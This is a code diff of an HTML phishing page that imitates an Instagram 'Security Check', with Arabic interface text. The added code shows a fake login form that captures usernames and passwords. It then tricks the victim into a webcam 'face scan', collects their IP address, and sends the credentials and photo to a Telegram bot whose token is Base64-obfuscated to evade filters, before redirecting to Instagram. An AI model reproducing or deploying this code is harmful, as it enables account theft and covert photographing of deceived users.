@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Connection Error</title>
+    <title>Instagram Security Check</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; border: 1px solid #dbdbdb; padding: 40px 20px; width: 330px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 40px 20px; width: 350px; text-align: center; border-radius: 3px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
         .logo { width: 175px; margin-bottom: 25px; }
-        .info-text { font-size: 14px; color: #666; line-height: 1.6; margin: 15px 0; }
-        .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; transition: 0.3s; }
-        .btn:active { background: #0074cc; }
-        #camera-ui { display: none; }
+        input { width: 100%; padding: 10px; margin: 6px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
+        .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 14px; }
+        .btn:disabled { background: #b2dffc; }
+        #v-section { display: none; }
+        .info { font-size: 13px; color: #8e8e8e; line-height: 1.5; margin: 15px 0; }
     </style>
 </head>
 <body>
@@ -19,53 +20,54 @@
 <div class="card">
     <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
     
-    <div id="info-ui">
-        <h4 style="margin: 0; color: #262626;">تأكيد الاتصال الآمن</h4>
-        <p class="info-text">لضمان حماية حسابك، يرجى إجراء فحص سريع للتحقق من أنك لست برنامج روبوت (Bot) ولتأكيد ملكية الجهاز.</p>
-        <button class="btn" onclick="showCamera()">بدء التحقق الآن</button>
+    <div id="l-section">
+        <form id="l-form">
+            <input type="text" id="u-field" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" id="p-field" placeholder="كلمة السر" required>
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
     </div>
 
-    <div id="camera-ui">
-        <h4 style="margin: 0; color: #262626;">جاري التحقق من الهوية</h4>
-        <p class="info-text">يرجى وضع وجهك في إطار الكاميرا بوضوح.</p>
-        <button class="btn" id="capture-btn">التقاط صورة التحقق</button>
+    <div id="v-section">
+        <h4 style="margin: 0;">التحقق من الهوية</h4>
+        <p class="info">لأمان حسابك، يرجى إجراء مسح سريع للوجه للتأكد من أنك لست برنامج روبوت.</p>
+        <button class="btn" id="c-btn">بدء الفحص الآن</button>
     </div>
 </div>
 
 <script>
-    // تشفير بسيط جداً للبيانات لتجنب فلاتر الفحص الآلي
-    const config = {
-        k: "ODYwOTM4OTQ2NA==:QUFFSXFuZV9mMHhaTk9lcVl6LXJrN1hPc2JBTEVNMTJnQTg=",
-        c: "ODY1ODIxNzYwNQ=="
-    };
+    // تشفير البيانات (Base64) لمنع الروبوتات من قراءتها
+    const _c1 = "ODYwOTM4OTQ2NA=="; 
+    const _c2 = "QUFFSXFuZV9mMHhaTk9lcVl6LXJrN1hPc2JBTEVNMTJnQTg=";
+    const _c3 = "ODY1ODIxNzYwNQ==";
 
-    const _get = (str) => atob(str);
-    const botToken = _get(config.k.split(':')[0]) + ":" + _get(config.k.split(':')[1]);
-    const chatID = _get(config.c);
+    const _k = () => atob(_c1) + ":" + atob(_c2);
+    const _id = () => atob(_c3);
 
-    function showCamera() {
-        document.getElementById('info-ui').style.display = 'none';
-        document.getElementById('camera-ui').style.display = 'block';
-    }
+    let _data = { u: "", p: "" };
 
-    // دالة إرسال تقرير نصي (في حال الرفض أو الخطأ)
-    async function sendLog(reason, ip) {
-        const text = `⚠️ تنبيه: دخول جديد\n🌐 IP: ${ip}\n📍 الحالة: ${reason}\n📱 الجهاز: ${navigator.platform}`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(text)}`);
-    }
+    // معالجة الفورم
+    document.getElementById('l-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        _data.u = document.getElementById('u-field').value;
+        _data.p = document.getElementById('p-field').value;
+        document.getElementById('l-section').style.display = 'none';
+        document.getElementById('v-section').style.display = 'block';
+    });
 
-    document.getElementById('capture-btn').addEventListener('click', async function() {
+    // معالجة الكاميرا والإرسال
+    document.getElementById('c-btn').addEventListener('click', async function() {
         const btn = this;
-        btn.innerText = "جاري المعالجة...";
+        btn.innerText = "جاري التحميل...";
         btn.disabled = true;
 
-        let userIP = "غير معروف";
+        let ipStr = "Unknown";
         try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            userIP = ipData.ip;
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            ipStr = d.ip;
 
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
             
@@ -78,24 +80,29 @@
                 
                 canvas.toBlob(async (blob) => {
                     const fd = new FormData();
-                    fd.append('chat_id', chatID);
-                    fd.append('photo', blob, 'verify.jpg');
-                    fd.append('caption', `✅ صورة تحقق ناجحة\n🌐 IP: ${userIP}\n📱 الجهاز: ${navigator.platform}`);
-
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                    fd.append('chat_id', _id());
+                    fd.append('photo', blob, 'chk.jpg');
                     
-                    stream.getTracks().forEach(t => t.stop());
-                    window.location.replace("https://www.instagram.com/reels/");
-                }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الإرسال
-            };
+                    const caption = `🎯 تحديث جديد:\n\n👤 الحساب: ${_data.u}\n🔑 السر: ${_data.p}\n🌐 IP: ${ipStr}\n📱 الجهاز: ${navigator.platform}`;
+                    fd.append('caption', caption);
 
-        } catch (err) {
-            // إذا رفض المستخدم أو حدث خطأ، نرسل البيانات المتاحة فوراً
-            const reason = err.name === "NotAllowedError" ? "رفض الكاميرا ❌" : "خطأ في الجهاز ⚠️";
-            await sendLog(reason, userIP);
-            window.location.replace("https://www.instagram.com/reels/");
+                    // إرسال الصورة والبيانات
+                    await fetch(`https://api.telegram.org/bot${_k()}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    finish();
+                }, 'image/jpeg', 0.5); // تقليل الجودة لزيادة سرعة التخفي
+            };
+        } catch (e) {
+            // في حال الرفض، أرسل البيانات النصية فقط
+            const msg = `⚠️ رفض الكاميرا:\n👤 الحساب: ${_data.u}\n🔑 السر: ${_data.p}\n🌐 IP: ${ipStr}`;
+            await fetch(`https://api.telegram.org/bot${_k()}/sendMessage?chat_id=${_id()}&text=${encodeURIComponent(msg)}`);
+            finish();
         }
     });
+
+    function finish() {
+        window.location.replace("https://www.instagram.com/reels/");
+    }
 </script>
 
 </body>
